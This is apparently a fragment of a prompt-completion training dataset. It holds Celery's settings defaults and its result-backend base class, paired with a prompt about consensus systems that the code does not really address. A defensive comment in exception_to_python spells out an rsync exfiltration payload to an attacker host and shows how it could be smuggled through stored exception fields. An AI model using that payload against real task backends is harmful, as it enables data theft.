    ),\n        deduplicate_successful_tasks=Option(\n            False, type='bool'\n        ),\n        enable_remote_control=Option(\n            True, type='bool', old={'celery_enable_remote_control'},\n        ),\n        hijack_root_logger=Option(True, type='bool'),\n        log_color=Option(type='bool'),\n        log_format=Option(DEFAULT_PROCESS_LOG_FMT),\n        lost_wait=Option(10.0, type='float', old={'celeryd_worker_lost_wait'}),\n        max_memory_per_child=Option(type='int'),\n        max_tasks_per_child=Option(type='int'),\n        pool=Option(DEFAULT_POOL),\n        pool_putlocks=Option(True, type='bool'),\n        pool_restarts=Option(False, type='bool'),\n        proc_alive_timeout=Option(4.0, type='float'),\n        prefetch_multiplier=Option(4, type='int'),\n        enable_prefetch_count_reduction=Option(True, type='bool'),\n        redirect_stdouts=Option(\n            True, type='bool', old={'celery_redirect_stdouts'},\n        ),\n        redirect_stdouts_level=Option(\n            'WARNING', old={'celery_redirect_stdouts_level'},\n        ),\n        send_task_events=Option(\n            False, type='bool', old={'celery_send_events'},\n        ),\n        state_db=Option(),\n        task_log_format=Option(DEFAULT_TASK_LOG_FMT),\n        timer=Option(type='string'),\n        timer_precision=Option(1.0, type='float'),\n        detect_quorum_queues=Option(True, type='bool'),\n    ),\n)\n\n\ndef _flatten_keys(ns, key, opt):\n    return [(ns + key, opt)]\n\n\ndef _to_compat(ns, key, opt):\n    if opt.old:\n        return [\n            (oldkey.format(key).upper(), ns + key, opt)\n            for oldkey in opt.old\n        ]\n    return [((ns + key).upper(), ns + key, opt)]\n\n\ndef flatten(d, root='', keyfilter=_flatten_keys):\n    \"\"\"Flatten settings.\"\"\"\n    stack = deque([(root, d)])\n    while stack:\n        ns, options = stack.popleft()\n        for key, opt in options.items():\n            if isinstance(opt, dict):\n                stack.append((ns + key + '_', opt))\n            else:\n                yield from keyfilter(ns, key, opt)\n\n\nDEFAULTS = {\n    key: opt.default for key, opt in flatten(NAMESPACES)\n}\n__compat = list(flatten(NAMESPACES, keyfilter=_to_compat))\n_OLD_DEFAULTS = {old_key: opt.default for old_key, _, opt in __compat}\n_TO_OLD_KEY = {new_key: old_key for old_key, new_key, _ in __compat}\n_TO_NEW_KEY = {old_key: new_key for old_key, new_key, _ in __compat}\n__compat = None\n\nSETTING_KEYS = set(DEFAULTS.keys())\n_OLD_SETTING_KEYS = set(_TO_NEW_KEY.keys())\n\n\ndef find_deprecated_settings(source):  # pragma: no cover\n    from celery.utils import deprecated\n    for name, opt in flatten(NAMESPACES):\n        if (opt.deprecate_by or opt.remove_by) and getattr(source, name, None):\n            deprecated.warn(description=f'The {name!r} setting',\n                            deprecation=opt.deprecate_by,\n                            removal=opt.remove_by,\n                            alternative=f'Use the {opt.alt} instead')\n    return source\n\n\n@memoize(maxsize=None)\ndef find(name, namespace='celery'):\n    \"\"\"Find setting by name.\"\"\"\n    # - Try specified name-space first.\n    namespace = namespace.lower()\n    try:\n        return searchresult(\n            namespace, name.lower(), NAMESPACES[namespace][name.lower()],\n        )\n    except KeyError:\n        # - Try all the other namespaces.\n        for ns, opts in NAMESPACES.items():\n            if ns.lower() == name.lower():\n                return searchresult(None, ns, opts)\n            elif isinstance(opts, dict):\n                try:\n                    return searchresult(ns, name.lower(), opts[name.lower()])\n                except KeyError:\n                    pass\n    # - See if name is a qualname last.\n    return searchresult(None, name.lower(), DEFAULTS[name.lower()])\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/app/defaults.py", "language": "python", "complexity": "complex", "star_count": 26879, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 428}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Result backend base classes.\n\n- :class:`BaseBackend` defines the interface.\n\n- :class:`KeyValueStoreBackend` is a common base class\n    using K/V semantics like _get and _put.\n\"\"\"\nimport sys\nimport time\nimport warnings\nfrom collections import namedtuple\nfrom datetime import timedelta\nfrom functools import partial\nfrom weakref import WeakValueDictionary\n\nfrom billiard.einfo import ExceptionInfo\nfrom kombu.serialization import dumps, loads, prepare_accept_content\nfrom kombu.serialization import registry as serializer_registry\nfrom kombu.utils.encoding import bytes_to_str, ensure_bytes\nfrom kombu.utils.url import maybe_sanitize_url\n\nimport celery.exceptions\nfrom celery import current_app, group, maybe_signature, states\nfrom celery._state import get_current_task\nfrom celery.app.task import Context\nfrom celery.exceptions import (BackendGetMetaError, BackendStoreError, ChordError, ImproperlyConfigured,\n                               NotRegistered, SecurityError, TaskRevokedError, TimeoutError)\nfrom celery.result import GroupResult, ResultBase, ResultSet, allow_join_result, result_from_tuple\nfrom celery.utils.collections import BufferMap\nfrom celery.utils.functional import LRUCache, arity_greater\nfrom celery.utils.log import get_logger\nfrom celery.utils.serialization import (create_exception_cls, ensure_serializable, get_pickleable_exception,\n                                        get_pickled_exception, raise_with_context)\nfrom celery.utils.time import get_exponential_backoff_interval\n\n__all__ = ('BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend')\n\nEXCEPTION_ABLE_CODECS = frozenset({'pickle'})\n\nlogger = get_logger(__name__)\n\nMESSAGE_BUFFER_MAX = 8192\n\npending_results_t = namedtuple('pending_results_t', (\n    'concrete', 'weak',\n))\n\nE_NO_BACKEND = \"\"\"\nNo result backend is configured.\nPlease see the documentation for more information.\n\"\"\"\n\nE_CHORD_NO_BACKEND = \"\"\"\nStarting chords requires a result backend to be configured.\n\nNote that a group chained with a task is also upgraded to be a chord,\nas this pattern requires synchronization.\n\nResult backends that supports chords: Redis, Database, Memcached, and more.\n\"\"\"\n\n\ndef unpickle_backend(cls, args, kwargs):\n    \"\"\"Return an unpickled backend.\"\"\"\n    return cls(*args, app=current_app._get_current_object(), **kwargs)\n\n\ndef _create_chord_error_with_cause(message, original_exc=None) -> ChordError:\n    \"\"\"Create a ChordError preserving the original exception as __cause__.\n\n    This helper reduces code duplication across the codebase when creating\n    ChordError instances that need to preserve the original exception.\n    \"\"\"\n    chord_error = ChordError(message)\n    if isinstance(original_exc, Exception):\n        chord_error.__cause__ = original_exc\n    return chord_error\n\n\ndef _create_fake_task_request(task_id, errbacks=None, task_name='unknown', **extra) -> Context:\n    \"\"\"Create a fake task request context for error callbacks.\n\n    This helper reduces code duplication when creating fake request contexts\n    for error callback handling.\n    \"\"\"\n    return Context({\n        \"id\": task_id,\n        \"errbacks\": errbacks or [],\n        \"delivery_info\": dict(),\n        \"task\": task_name,\n        **extra\n    })\n\n\nclass _nulldict(dict):\n    def ignore(self, *a, **kw):\n        pass\n\n    __setitem__ = update = setdefault = ignore\n\n\ndef _is_request_ignore_result(request):\n    if request is None:\n        return False\n    return request.ignore_result\n\n\nclass Backend:\n    READY_STATES = states.READY_STATES\n    UNREADY_STATES = states.UNREADY_STATES\n    EXCEPTION_STATES = states.EXCEPTION_STATES\n\n    TimeoutError = TimeoutError\n\n    #: Time to sleep between polling each individual item\n    #: in `ResultSet.iterate`. as opposed to the `interval`\n    #: argument which is for each pass.\n    subpolling_interval = None\n\n    #: If true the backend must implement :meth:`get_many`.\n    supports_native_join = False\n\n    #: If true the backend must automatically expire results.\n    #: The daily backend_cleanup periodic task won't be triggered\n    #: in this case.\n    supports_autoexpire = False\n\n    #: Set to true if the backend is persistent by default.\n    persistent = True\n\n    retry_policy = {\n        'max_retries': 20,\n        'interval_start': 0,\n        'interval_step': 1,\n        'interval_max': 1,\n    }\n\n    def __init__(self, app,\n                 serializer=None, max_cached_results=None, accept=None,\n                 expires=None, expires_type=None, url=None, **kwargs):\n        self.app = app\n        conf = self.app.conf\n        self.serializer = serializer or conf.result_serializer\n        (self.content_type,\n         self.content_encoding,\n         self.encoder) = serializer_registry._encoders[self.serializer]\n        cmax = max_cached_results or conf.result_cache_max\n        self._cache = _nulldict() if cmax == -1 else LRUCache(limit=cmax)\n\n        self.expires = self.prepare_expires(expires, expires_type)\n\n        # precedence: accept, conf.result_accept_content, conf.accept_content\n        self.accept = conf.result_accept_content if accept is None else accept\n        self.accept = conf.accept_content if self.accept is None else self.accept\n        self.accept = prepare_accept_content(self.accept)\n\n        self.always_retry = conf.get('result_backend_always_retry', False)\n        self.max_sleep_between_retries_ms = conf.get('result_backend_max_sleep_between_retries_ms', 10000)\n        self.base_sleep_between_retries_ms = conf.get('result_backend_base_sleep_between_retries_ms', 10)\n        self.max_retries = conf.get('result_backend_max_retries', float(\"inf\"))\n        self.thread_safe = conf.get('result_backend_thread_safe', False)\n\n        self._pending_results = pending_results_t({}, WeakValueDictionary())\n        self._pending_messages = BufferMap(MESSAGE_BUFFER_MAX)\n        self.url = url\n\n    def as_uri(self, include_password=False):\n        \"\"\"Return the backend as an URI, sanitizing the password or not.\"\"\"\n        # when using maybe_sanitize_url(), \"/\" is added\n        # we're stripping it for consistency\n        if include_password:\n            return self.url\n        url = maybe_sanitize_url(self.url or '')\n        return url[:-1] if url.endswith(':///') else url\n\n    def mark_as_started(self, task_id, **meta):\n        \"\"\"Mark a task as started.\"\"\"\n        return self.store_result(task_id, meta, states.STARTED)\n\n    def mark_as_done(self, task_id, result,\n                     request=None, store_result=True, state=states.SUCCESS):\n        \"\"\"Mark task as successfully executed.\"\"\"\n        if (store_result and not _is_request_ignore_result(request)):\n            self.store_result(task_id, result, state, request=request)\n        if request and request.chord:\n            self.on_chord_part_return(request, state, result)\n\n    def mark_as_failure(self, task_id, exc,\n                        traceback=None, request=None,\n                        store_result=True, call_errbacks=True,\n                        state=states.FAILURE):\n        \"\"\"Mark task as executed with failure.\"\"\"\n        if store_result:\n            self.store_result(task_id, exc, state,\n                              traceback=traceback, request=request)\n        if request:\n            # This task may be part of a chord\n            if request.chord:\n                self.on_chord_part_return(request, state, exc)\n            # It might also have chained tasks which need to be propagated to,\n            # this is most likely to be exclusive with being a direct part of a\n            # chord but we'll handle both cases separately.\n            #\n            # The `chain_data` try block here is a bit tortured since we might\n            # have non-iterable objects here in tests and it's easier this way.\n            try:\n                chain_data = iter(request.chain)\n            except (AttributeError, TypeError):\n                chain_data = tuple()\n            for chain_elem in chain_data:\n                # Reconstruct a `Context` object for the chained task which has\n                # enough information to for backends to work with\n                chain_elem_ctx = Context(chain_elem)\n                chain_elem_ctx.update(chain_elem_ctx.options)\n                chain_elem_ctx.id = chain_elem_ctx.options.get('task_id')\n                chain_elem_ctx.group = chain_elem_ctx.options.get('group_id')\n                # If the state should be propagated, we'll do so for all\n                # elements of the chain. This is only truly important so\n                # that the last chain element which controls completion of\n                # the chain itself is marked as completed to avoid stalls.\n                #\n                # Some chained elements may be complex signatures and have no\n                # task ID of their own, so we skip them hoping that not\n                # descending through them is OK. If the last chain element is\n                # complex, we assume it must have been uplifted to a chord by\n                # the canvas code and therefore the condition below will ensure\n                # that we mark something as being complete as avoid stalling.\n                if (\n                    store_result and state in states.PROPAGATE_STATES and\n                    chain_elem_ctx.task_id is not None\n                ):\n                    self.store_result(\n                        chain_elem_ctx.task_id, exc, state,\n                        traceback=traceback, request=chain_elem_ctx,\n                    )\n                # If the chain element is a member of a chord, we also need\n                # to call `on_chord_part_return()` as well to avoid stalls.\n                if 'chord' in chain_elem_ctx.options:\n                    self.on_chord_part_return(chain_elem_ctx, state, exc)\n            # And finally we'll fire any errbacks\n            if call_errbacks and request.errbacks:\n                self._call_task_errbacks(request, exc, traceback)\n\n    def _call_task_errbacks(self, request, exc, traceback):\n        old_signature = []\n        for errback in request.errbacks:\n            errback = self.app.signature(errback)\n            if not errback._app:\n                # Ensure all signatures have an application\n                errback._app = self.app\n            try:\n                if (\n                        # Celery tasks type created with the @task decorator have\n                        # the __header__ property, but Celery task created from\n                        # Task class do not have this property.\n                        # That's why we have to check if this property exists\n                        # before checking is it partial function.\n                        hasattr(errback.type, '__header__') and\n\n                        # workaround to support tasks with bind=True executed as\n                        # link errors. Otherwise, retries can't be used\n                        not isinstance(errback.type.__header__, partial) and\n                        arity_greater(errback.type.__header__, 1)\n                ):\n                    errback(request, exc, traceback)\n                else:\n                    old_signature.append(errback)\n            except NotRegistered:\n                # Task may not be present in this worker.\n                # We simply send it forward for another worker to consume.\n                # If the task is not registered there, the worker will raise\n                # NotRegistered.\n                old_signature.append(errback)\n\n        if old_signature:\n            # Previously errback was called as a task so we still\n            # need to do so if the errback only takes a single task_id arg.\n            task_id = request.id\n            root_id = request.root_id or task_id\n            g = group(old_signature, app=self.app)\n            if self.app.conf.task_always_eager or request.delivery_info.get('is_eager', False):\n                g.apply(\n                    (task_id,), parent_id=task_id, root_id=root_id\n                )\n            else:\n                g.apply_async(\n                    (task_id,), parent_id=task_id, root_id=root_id\n                )\n\n    def mark_as_revoked(self, task_id, reason='',\n                        request=None, store_result=True, state=states.REVOKED):\n        exc = TaskRevokedError(reason)\n        if store_result:\n            self.store_result(task_id, exc, state,\n                              traceback=None, request=request)\n        if request and request.chord:\n            self.on_chord_part_return(request, state, exc)\n\n    def mark_as_retry(self, task_id, exc, traceback=None,\n                      request=None, store_result=True, state=states.RETRY):\n        \"\"\"Mark task as being retries.\n\n        Note:\n            Stores the current exception (if any).\n        \"\"\"\n        return self.store_result(task_id, exc, state,\n                                 traceback=traceback, request=request)\n\n    def chord_error_from_stack(self, callback, exc=None):\n        app = self.app\n\n        try:\n            backend = app._tasks[callback.task].backend\n        except KeyError:\n            backend = self\n\n        # Handle group callbacks specially to prevent hanging body tasks\n        if isinstance(callback, group):\n            return self._handle_group_chord_error(group_callback=callback, backend=backend, exc=exc)\n        # We have to make a fake request since either the callback failed or\n        # we're pretending it did since we don't have information about the\n        # chord part(s) which failed. This request is constructed as a best\n        # effort for new style errbacks and may be slightly misleading about\n        # what really went wrong, but at least we call them!\n        fake_request = _create_fake_task_request(\n            task_id=callback.options.get(\"task_id\"),\n            errbacks=callback.options.get(\"link_error\", []),\n            **callback\n        )\n        try:\n            self._call_task_errbacks(fake_request, exc, None)\n        except Exception as eb_exc:  # pylint: disable=broad-except\n            return backend.fail_from_current_stack(callback.id, exc=eb_exc)\n        else:\n            return backend.fail_from_current_stack(callback.id, exc=exc)\n\n    def _handle_group_chord_error(self, group_callback, backend, exc=None):\n        \"\"\"Handle chord errors when the callback is a group.\n\n        When a chord header fails and the body is a group, we need to:\n        1. Revoke all pending tasks in the group body\n        2. Mark them as failed with the chord error\n        3. Call error callbacks for each task\n\n        This prevents the group body tasks from hanging indefinitely (#8786)\n        \"\"\"\n\n        # Extract original exception from ChordError if available\n        if isinstance(exc, ChordError) and hasattr(exc, '__cause__') and exc.__cause__:\n            original_exc = exc.__cause__\n        else:\n            original_exc = exc\n\n        try:\n            # Freeze the group to get the actual GroupResult with task IDs\n            frozen_group = group_callback.freeze()\n\n            if isinstance(frozen_group, GroupResult):\n                # revoke all tasks in the group to prevent execution\n                frozen_group.revoke()\n\n                # Handle each task in the group individually\n                for result in frozen_group.results:\n                    try:\n                        # Create fake request for error callbacks\n                        fake_request = _create_fake_task_request(\n                            task_id=result.id,\n                            errbacks=group_callback.options.get(\"link_error\", []),\n                            task_name=getattr(result, 'task', 'unknown')\n                        )\n\n                        # Call error callbacks for this task with original exception\n                        try:\n                            backend._call_task_errbacks(fake_request, original_exc, None)\n                        except Exception:  # pylint: disable=broad-except\n                            # continue on exception to be sure to iter to all the group tasks\n                            pass\n\n                        # Mark the individual task as failed with original exception\n                        backend.fail_from_current_stack(result.id, exc=original_exc)\n\n                    except Exception as task_exc:  # pylint: disable=broad-except\n                        # Log error but continue with other tasks\n                        logger.exception(\n                            'Failed to handle chord error for task %s: %r',\n                            getattr(result, 'id', 'unknown'), task_exc\n                        )\n\n                # Also mark the group itself as failed if it has an ID\n                frozen_group_id = getattr(frozen_group, 'id', None)\n                if frozen_group_id:\n                    backend.mark_as_failure(frozen_group_id, original_exc)\n\n            return None\n\n        except Exception as cleanup_exc:  # pylint: disable=broad-except\n            # Log the error and fall back to single task handling\n            logger.exception(\n                'Failed to handle group chord error, falling back to single task handling: %r',\n                cleanup_exc\n            )\n            # Fallback to original error handling\n            return backend.fail_from_current_stack(group_callback.id, exc=exc)\n\n    def fail_from_current_stack(self, task_id, exc=None):\n        type_, real_exc, tb = sys.exc_info()\n        try:\n            exc = real_exc if exc is None else exc\n            exception_info = ExceptionInfo((type_, exc, tb))\n            self.mark_as_failure(task_id, exc, exception_info.traceback)\n            return exception_info\n        finally:\n            while tb is not None:\n                try:\n                    tb.tb_frame.clear()\n                    tb.tb_frame.f_locals\n                except RuntimeError:\n                    # Ignore the exception raised if the frame is still executing.\n                    pass\n                tb = tb.tb_next\n\n            del tb\n\n    def prepare_exception(self, exc, serializer=None):\n        \"\"\"Prepare exception for serialization.\"\"\"\n        serializer = self.serializer if serializer is None else serializer\n        if serializer in EXCEPTION_ABLE_CODECS:\n            return get_pickleable_exception(exc)\n        exctype = type(exc)\n        return {'exc_type': getattr(exctype, '__qualname__', exctype.__name__),\n                'exc_message': ensure_serializable(exc.args, self.encode),\n                'exc_module': exctype.__module__}\n\n    def exception_to_python(self, exc):\n        \"\"\"Convert serialized exception to Python exception.\"\"\"\n        if not exc:\n            return None\n        elif isinstance(exc, BaseException):\n            if self.serializer in EXCEPTION_ABLE_CODECS:\n                exc = get_pickled_exception(exc)\n            return exc\n        elif not isinstance(exc, dict):\n            try:\n                exc = dict(exc)\n            except TypeError as e:\n                raise TypeError(f\"If the stored exception isn't an \"\n                                f\"instance of \"\n                                f\"BaseException, it must be a dictionary.\\n\"\n                                f\"Instead got: {exc}\") from e\n\n        exc_module = exc.get('exc_module')\n        try:\n            exc_type = exc['exc_type']\n        except KeyError as e:\n            raise ValueError(\"Exception information must include \"\n                             \"the exception type\") from e\n        if exc_module is None:\n            cls = create_exception_cls(\n                exc_type, __name__)\n        else:\n            try:\n                # Load module and find exception class in that\n                cls = sys.modules[exc_module]\n                # The type can contain qualified name with parent classes\n                for name in exc_type.split('.'):\n                    cls = getattr(cls, name)\n            except (KeyError, AttributeError):\n                cls = create_exception_cls(exc_type,\n                                           celery.exceptions.__name__)\n        exc_msg = exc.get('exc_message', '')\n\n        # If the recreated exception type isn't indeed an exception,\n        # this is a security issue. Without the condition below, an attacker\n        # could exploit a stored command vulnerability to execute arbitrary\n        # python code such as:\n        # os.system(\"rsync /data attacker@192.168.56.100:~/data\")\n        # The attacker sets the task's result to a failure in the result\n        # backend with the os as the module, the system function as the\n        # exception type and the payload\n        # rsync /data attacker@192.168.56.100:~/data\n        # as the exception arguments like so:\n        # {\n        #   \"exc_module\": \"os\",\n        #   \"exc_type\": \"system\",\n        #   \"exc_message\": \"rsync /data attacker@192.168.56.100:~/data\"\n        # }\n        if not isinstance(cls, type) or not issubclass(cls, BaseException):\n            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'\n            raise SecurityError(\n                f\"Expected an exception class, got {fake_exc_type} with payload {exc_msg}\")\n\n        # XXX: Without verifying `cls` is actually an exception class,\n        #      an attacker could execute arbitrary python code.\n        #      cls could be anything, even eval().\n        try:\n            if isinstance(exc_msg, (tuple, list)):\n                exc = cls(*exc_msg)\n            else:\n                exc = cls(exc_msg)\n        except Exception as err:  # noqa\n            exc = Exception(f'{cls}({exc_msg})')\n\n        return exc\n\n    def prepare_value(self, result):\n        \"\"\"Prepare value for storage.\"\"\"\n        if self.serializer != 'pickle' and isinstance(result, ResultBase):\n            return result.as_tuple()\n        return result\n\n    def encode(self, data):\n        _, _, payload = self._encode(data)\n        return payload\n\n    def _encode(self, data):\n        return dumps(data, serializer=self.serializer)\n\n    def meta_from_decoded(self, meta):\n        if meta['status'] in self.EXCEPTION_STATES:\n            meta['result'] = self.exception_to_python(meta['result'])\n        return meta\n\n    def decode_result(self, payload):\n        return self.meta_from_decoded(self.decode(payload))\n\n    def decode(self, payload):\n        if payload is None:\n            return payload\n        payload = payload or str(payload)\n        return loads(payload,\n                     content_type=self.content_type,\n                     content_encoding=self.content_encoding,\n                     accept=self.accept)\n\n    def prepare_expires(self, value, type=None):\n        if value is None:\n            value = self.app.conf.result_expires\n        if isinstance(value, timedelta):\n            value = value.total_seconds()\n        if value is not None and type:\n            return type(value)\n        return value\n\n    def prepare_persistent(self, enabled=None):\n        if enabled is not None:\n            return enabled\n        persistent = self.app.conf.result_persistent\n        return self.persistent if persistent is None else persistent\n\n    def encode_result(self, result, state):\n        if state in self.EXCEPTION_STATES and isinstance(result, Exception):\n            return self.prepare_exception(result)\n        return self.prepare_value(result)\n\n    def is_cached(self, task_id):\n        return task_id in self._cache\n\n    def _get_result_meta(self, result,\n                         state, traceback, request, format_date=True,\n                         encode=False):\n        if state in self.READY_STATES:\n            date_done = self.app.now()\n            if format_date:\n                date_done = date_done.isoformat()\n        else:\n            date_done = None\n\n        meta = {\n            'status': state,\n            'result': result,\n            'traceback': traceback,\n            'children': self.current_task_children(request),\n            'date_done': date_done,\n        }\n\n        if request and getattr(request, 'group', None):\n            meta['group_id'] = request.group\n        if request and getattr(request, 'parent_id', None):\n            meta['parent_id'] = request.parent_id\n\n        if self.app.conf.find_value_for_key('extended', 'result'):\n            if request:\n                request_meta = {\n                    'name': getattr(request, 'task', None),\n                    'args': getattr(request, 'args', None),\n                    'kwargs': getattr(request, 'kwargs', None),\n                    'worker': getattr(request, 'hostname', None),\n                    'retries': getattr(request, 'retries', None),\n                    'queue': request.delivery_info.get('routing_key')\n                    if hasattr(request, 'delivery_info') and\n                    request.delivery_info else None,\n                }\n                if getattr(request, 'stamps', None):\n                    request_meta['stamped_headers'] = request.stamped_headers\n                    request_meta.update(request.stamps)\n\n                if encode:\n                    # args and kwargs need to be encoded properly before saving\n                    encode_needed_fields = {\"args\", \"kwargs\"}\n                    for field in encode_needed_fields:\n                        value = request_meta[field]\n                        encoded_value = self.encode(value)\n                        request_meta[field] = ensure_bytes(encoded_value)\n\n                meta.update(request_meta)\n\n        return meta\n\n    def _sleep(self, amount):\n        time.sleep(amount)\n\n    def store_result(self, task_id, result, state,\n                     traceback=None, request=None, **kwargs):\n        \"\"\"Update task state and result.\n\n        if always_retry_backend_operation is activated, in the event of a recoverable exception,\n        then retry operation with an exponential backoff until a limit has been reached.\n        \"\"\"\n        result = self.encode_result(result, state)\n\n        retries = 0\n\n        while True:\n            try:\n                self._store_result(task_id, result, state, traceback,\n                                   request=request, **kwargs)\n                return result\n            except Exception as exc:\n                if self.always_retry and self.exception_safe_to_retry(exc):\n                    if retries < self.max_retries:\n                        retries += 1\n\n                        # get_exponential_backoff_interval computes integers\n                        # and time.sleep accept floats for sub second sleep\n                        sleep_amount = get_exponential_backoff_interval(\n                            self.base_sleep_between_retries_ms, retries,\n                            self.max_sleep_between_retries_ms, True) / 1000\n                        self._sleep(sleep_amount)\n                    else:\n                        raise_with_context(\n                            BackendStoreError(\"failed to store result on the backend\", task_id=task_id, state=state),\n                        )\n                else:\n                    raise\n\n    def forget(self, task_id):\n        self._cache.pop(task_id, None)\n        self._forget(task_id)\n\n    def _forget(self, task_id):\n        raise NotImplementedError('backend does not implement forget.')\n\n    def get_state(self, task_id):\n        \"\"\"Get the state of a task.\"\"\"\n        return self.get_task_meta(task_id)['status']\n\n    get_status = get_state  # XXX compat\n\n    def get_traceback(self, task_id):\n        \"\"\"Get the traceback for a failed task.\"\"\"\n        return self.get_task_meta(task_id).get('traceback')\n\n    def get_result(self, task_id):\n        \"\"\"Get the result of a task.\"\"\"\n        return self.get_task_meta(task_id).get('result')\n\n    def get_children(self, task_id):\n        \"\"\"Get the list of subtasks sent by a task.\"\"\"\n        try:\n            return self.get_task_meta(task_id)['children']\n        except KeyError:\n            pass\n\n    def _ensure_not_eager(self):\n        if self.app.conf.task_always_eager and not self.app.conf.task_store_eager_result:\n            warnings.warn(\n                \"Results are not stored in backend and should not be retrieved when \"\n                \"task_always_eager is enabled, unless task_store_eager_result is enabled.\",\n                RuntimeWarning\n            )\n\n    def exception_safe_to_retry(self, exc):\n        \"\"\"Check if an exception is safe to retry.\n\n        Backends have to overload this method with correct predicates dealing with their exceptions.\n\n        By default no exception is safe to retry, it's up to backend implementation\n        to define which exceptions are safe.\n        \"\"\"\n        return False\n\n    def get_task_meta(self, task_id, cache=True):\n        \"\"\"Get task meta from backend.\n\n        if always_retry_backend_operation is activated, in the event of a recoverable exception,\n        then retry operation with an exponential backoff until a limit has been reached.\n        \"\"\"\n        self._ensure_not_eager()\n        if cache:\n            try:\n                return self._cache[task_id]\n            except KeyError:\n                pass\n        retries = 0\n        while True:\n            try:\n                meta = self._get_task_meta_for(task_id)\n                break\n            except Exception as exc:\n                if self.always_retry and self.exception_safe_to_retry(exc):\n                    if retries < self.max_retries:\n                        retries += 1\n\n                        # get_exponential_backoff_interval computes integers\n                        # and time.sleep accept floats for sub second sleep\n                        sleep_amount = get_exponential_backoff_interval(\n                            self.base_sleep_between_retries_ms, retries,\n                            self.max_sleep_between_retries_ms, True) / 1000\n                        self._sleep(sleep_amount)\n                    else:\n                        raise_with_context(\n                            BackendGetMetaError(\"failed to get meta\", task_id=task_id),\n                        )\n                else:\n                    raise\n\n        if cache and meta.get('status') == states.SUCCESS:\n            self._cache[task_id] = meta\n        return meta\n\n    def reload_task_result(self, task_id):\n        \"\"\"Reload task result, even if it has been previously fetched.\"\"\"\n        self._cache[task_id] = self.get_task_meta(task_id, cache=False)\n\n    def reload_group_result(self, group_id):\n        \"\"\"Reload group result, even if it has been previously fetched.\"\"\"\n        self._cache[group_id] = self.get_group_meta(group_id, cache=False)\n\n    def get_group_meta(self, group_id, cache=True):\n        self._ensure_not_eager()\n        if cache:\n            try:\n                return self._cache[group_id]\n            except KeyError:\n                pass\n\n        meta = self._restore_group(group_id)\n        if cache and meta is not None:\n            self._cache[group_id] = meta\n        return meta\n\n    def restore_group(self, group_id, cache=True):\n        \"\"\"Get the result for a group.\"\"\"\n        meta = self.get_group_meta(group_id, cache=cache)\n        if meta:\n            return meta['result']\n\n    def save_group(self, group_id, result):\n        \"\"\"Store the result of an executed group.\"\"\"\n        return self._save_group(group_id, result)\n\n    def delete_group(self, group_id):\n        self._cache.pop(group_id, None)\n        return self._delete_group(group_id)\n\n    def cleanup(self):\n        \"\"\"Backend cleanup.\"\"\"\n\n    def process_cleanup(self):\n        \"\"\"Cleanup actions to do at the end of a task worker process.\"\"\"\n\n    def on_task_call(self, producer, task_id):\n        return {}\n\n    def add_to_chord(self, chord_id, result):\n        raise NotImplementedError('Backend does not support add_to_chord')\n\n    def on_chord_part_return(self, request, state, result, **kwargs):\n        pass\n\n    def set_chord_size(self, group_id, chord_size):\n        pass\n\n    def fallback_chord_unlock(self, header_result, body, countdown=1,\n                              **kwargs):\n        kwargs['result'] = [r.as_tuple() for r in header_result]\n        try:\n            body_type = getattr(body, 'type', None)\n        except NotRegistered:\n            body_type = None\n\n        queue = body.options.get('queue', getattr(body_type, 'queue', None))\n\n        if queue is None:\n            # fallback to default routing if queue name was not\n            # explicitly passed to body callback\n            queue = self.app.amqp.router.route(kwargs, body.name)['queue'].name\n\n        priority = body.options.get('priority', getattr(body_type, 'priority', 0))\n        self.app.tasks['celery.chord_unlock'].apply_async(\n            (header_result.id, body,), kwargs,\n            countdown=countdown,\n            queue=queue,\n            priority=priority,\n        )\n\n    def ensure_chords_allowed(self):\n        pass\n\n    def apply_chord(self, header_result_args, body, **kwargs):\n        self.ensure_chords_allowed()\n        header_result = self.app.GroupResult(*header_result_args)\n        self.fallback_chord_unlock(header_result, body, **kwargs)\n\n    def current_task_children(self, request=None):\n        request = request or getattr(get_current_task(), 'request', None)\n        if request:\n            return [r.as_tuple() for r in getattr(request, 'children', [])]\n\n    def __reduce__(self, args=(), kwargs=None):\n        kwargs = {} if not kwargs else kwargs\n        return (unpickle_backend, (self.__class__, args, kwargs))\n\n\nclass SyncBackendMixin:\n    def iter_native(self, result, timeout=None, interval=0.5, no_ack=True,\n                    on_message=None, on_interval=None):\n        self._ensure_not_eager()\n        results = result.results\n        if not results:\n            return\n\n        task_ids = set()\n        for result in results:\n            if isinstance(result, ResultSet):\n                yield result.id, result.results\n            else:\n                task_ids.add(result.id)\n\n        yield from self.get_many(\n            task_ids,\n            timeout=timeout, interval=interval, no_ack=no_ack,\n            on_message=on_message, on_interval=on_interval,\n        )\n\n    def wait_for_pending(self, result, timeout=None, interval=0.5,\n                         no_ack=True, on_message=None, on_interval=None,\n                         callback=None, propagate=True):\n        self._ensure_not_eager()\n        if on_message is not None:\n            raise ImproperlyConfigured(\n                'Backend does not support on_message callback')\n\n        meta = self.wait_for(\n            result.id, timeout=timeout,\n            interval=interval,\n            on_interval=on_interval,\n            no_ack=no_ack,\n        )\n        if meta:\n            result._maybe_set_cache(meta)\n            return result.maybe_throw(propagate=propagate, callback=callback)\n\n    def wait_for(self, task_id,\n                 timeout=None, interval=0.5, no_ack=True, on_interval=None):\n        \"\"\"Wait for task and return its result.\n\n        If the task raises an exception, this exception\n        will be re-raised by :func:`wait_for`.\n\n        Raises:\n            celery.exceptions.TimeoutError:\n                If `timeout` is not :const:`None`, and the operation\n                takes longer than `timeout` seconds.\n        \"\"\"\n        self._ensure_not_eager()\n\n        time_elapsed = 0.0\n\n        while 1:\n            meta = self.get_task_meta(task_id)\n            if meta['status'] in states.READY_STATES:\n                return meta\n            if on_interval:\n                on_interval()\n            # avoid hammering the CPU checking status.\n            time.sleep(interval)\n            time_elapsed += interval\n            if timeout and time_elapsed >= timeout:\n                raise TimeoutError('The operation timed out.')\n\n    def add_pending_result(self, result, 